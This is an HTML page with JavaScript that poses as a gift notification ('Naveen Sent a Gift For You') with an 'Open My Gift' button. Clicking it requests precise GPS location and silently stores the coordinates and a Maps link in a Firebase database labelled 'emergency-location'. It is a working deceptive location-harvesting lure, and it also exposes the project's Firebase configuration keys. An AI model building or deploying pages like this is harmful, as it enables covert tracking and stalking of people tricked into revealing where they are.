<!DOCTYPE html>
<html lang="te">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Emergency Location Sharing</title>

<style>
* {
  box-sizing: border-box;
}

body {
  font-family: Arial, sans-serif;
  background: #f1f4f9;
  display: grid;
  place-items: center;
  min-height: 100vh;
  margin: 0;
  padding: 20px;
}

.card {
  background: white;
  padding: 28px;
  border-radius: 20px;
  max-width: 420px;
  width: 100%;
  text-align: center;
  box-shadow: 0 8px 30px #0001;
}

button {
  background: #1769e0;
  color: white;
  border: 0;
  padding: 17px;
  width: 100%;
  border-radius: 12px;
  font-size: 18px;
  margin-top: 20px;
  cursor: pointer;
}

button:disabled {
  background: #888;
  cursor: not-allowed;
}

p {
  color: #555;
  line-height: 1.6;
}

#status {
  margin-top: 18px;
  overflow-wrap: anywhere;
}

a {
  color: #1769e0;
  font-weight: bold;
}
</style>
</head>

<body>

<div class="card">

  <h2>Naveen Sent a Gift For You</h2>

  <p>
    Naveen Sent Gift For You
  </p>

  <p>
    Allow Button and Reveal your Gift
  </p>

  <button id="share">
    Open My Gift
  </button>

  <p id="status" role="status" aria-live="polite"></p>

</div>

<script type="module">

import {
  initializeApp
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
  getDatabase,
  ref,
  push,
  set
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

import {
  getAuth,
  signInAnonymously
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyDNo1kMFQMrOgb2bZT1TFOQ5wUHXp3HS-8",
  authDomain: "emergency-location-14c61.firebaseapp.com",
  databaseURL: "https://emergency-location-14c61-default-rtdb.firebaseio.com",
  projectId: "emergency-location-14c61",
  storageBucket: "emergency-location-14c61.firebasestorage.app",
  messagingSenderId: "822733393681",
  appId: "1:822733393681:web:6dcc01b4f22db5dc94c6b0"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const auth = getAuth(app);

const button = document.getElementById("share");
const status = document.getElementById("status");

button.addEventListener("click", async () => {

  button.disabled = true;
  status.textContent = "Connecting...";

  try {

    if (!navigator.geolocation) {
      throw new Error("ఈ బ్రౌజర్ GPS కు మద్దతు ఇవ్వడం లేదు.");
    }

    status.textContent =
      "మీ GPS అనుమతి కోసం వేచి ఉంది...";

    const position = await new Promise((resolve, reject) => {

      navigator.geolocation.getCurrentPosition(
        resolve,
        reject,
        {
          enableHighAccuracy: true,
          timeout: 20000,
          maximumAge: 0
        }
      );

    });

    status.textContent = "Secure connection ఏర్పడుతోంది...";

    await signInAnonymously(auth);

    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;

    const mapsLink =
      `https://www.google.com/maps?q=${latitude},${longitude}`;

    const locationRef = push(
      ref(db, "emergencyLocations")
    );

    await set(locationRef, {

      latitude: latitude,
      longitude: longitude,
      accuracy: position.coords.accuracy,
      timestamp: Date.now(),
      mapsLink: mapsLink

    });

    status.innerHTML =
      "Gift Opened.<br><br>" +
      '<a target="_blank" rel="noopener noreferrer" href="' +
      mapsLink +
      '">Google Maps లో లొకేషన్ చూడండి</a>';

  } catch (error) {

    console.error(error);

    status.textContent =
      "లొకేషన్ Share కాలేదు: " + error.message;

  } finally {

    button.disabled = false;

  }

});

</script>

</body>
</html>
